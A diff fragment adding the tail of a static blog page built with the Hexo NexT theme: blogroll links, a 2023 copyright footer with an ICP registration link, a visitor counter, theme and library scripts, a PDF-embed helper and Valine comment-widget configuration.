+          <a href="https://0clickjacking0.github.io/" title="https:&#x2F;&#x2F;0clickjacking0.github.io&#x2F;" rel="noopener" target="_blank">xianyu123</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jiang-niao.github.io/" title="https:&#x2F;&#x2F;jiang-niao.github.io&#x2F;" rel="noopener" target="_blank">JiangNiao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://xiaolong22333.top/" title="https:&#x2F;&#x2F;xiaolong22333.top&#x2F;" rel="noopener" target="_blank">xiaolong</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+
+
+<!--
+ <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+-->
+
+
+  <span class="author" itemprop="copyrightHolder">安小琪</span>
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2020030100号 </a>
+  </div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'nhITwFwMLqOi81E1nOPXx9Iw-MdYXbMMI',
+      appKey     : 'F9l5INUqgwxvbJOfC1X7OMnr',
+      placeholder: "欢迎在这里留言！我看到一定会及时回复的噢 （PS：回复信息会自动发送到你所填写的邮箱噢）",
+      avatar     : '',
+      meta       : guest,
+      pageSize   : '6' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
